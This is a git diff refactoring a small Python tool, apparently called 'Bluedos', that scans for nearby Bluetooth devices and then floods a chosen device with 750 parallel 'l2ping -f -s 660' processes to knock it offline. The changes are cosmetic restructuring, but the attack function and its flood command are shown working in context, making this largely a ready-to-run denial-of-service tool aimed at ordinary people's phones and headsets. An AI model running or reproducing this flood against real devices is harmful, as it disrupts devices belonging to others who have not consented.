@@ -1,23 +1,21 @@
-# Bluedos by @ceigh
 from os import getuid, kill
-from signal import SIGTERM
 from subprocess import check_output, Popen, DEVNULL
+from time import sleep
 
 
 def confirm(question):
-    while 1:
-        try:
+    try:
+        while 1:
             reply = input(f"{question}: ").lower()[:1]
-            if reply in 'y':  # 'yosjtdд' (international), using {in} to consider the enter
+            if reply in 'yosjtdд':  # (international), using {in} to consider enter too
                 return 1
             elif reply == 'n':
                 return 0
-        except (KeyboardInterrupt, EOFError):
-            bye()
+    except (KeyboardInterrupt, EOFError):
+        bye()
 
 
 def bye():
-    from time import sleep
     print("\nBye!")
     sleep(1)
     print('\033c')
@@ -25,16 +23,16 @@ def bye():
 
 
 def get_devices():
-    if len(check_output(['hcitool', 'dev'])[9:]):
-        print("\033cScanning...\n")
-        hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
-        devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
-        return devices
-    else:
+    if not len(check_output(['hcitool', 'dev'])[9:]):
         exit("Enable Bluetooth first")
+    print("\033cScanning...\n")
+    hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
+    devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
+    return devices
 
 
 def attack(target):
+    from signal import SIGTERM
     print(f"\033c\nTrying on '{target[1]}', please wait...")
     pids = [Popen(['l2ping', '-f', '-s', '660', target[0]], stdout=DEVNULL).pid for i in range(750)]
     try:
@@ -48,11 +46,9 @@ def main():
     devices = get_devices()
     dev_number = len(devices)
     if not dev_number:
-        print("No devices around :(")
-        if confirm("Scan again?"):
-            main()
-        else:
+        if not confirm("No devices around :(\nScan again?"):
             bye()
+        main()
     elif dev_number == 1:
         attack(devices[0])
     else:
